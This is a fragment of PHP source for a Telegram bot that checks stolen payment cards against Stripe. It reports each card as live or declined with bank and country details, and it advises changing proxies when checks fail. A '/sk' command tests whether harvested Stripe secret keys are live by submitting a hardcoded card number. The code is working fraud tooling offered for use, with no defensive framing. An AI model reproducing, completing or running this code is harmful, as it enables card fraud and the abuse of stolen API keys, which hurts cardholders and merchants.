sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}


//==[Sk Key Check Command]=//

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!");
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>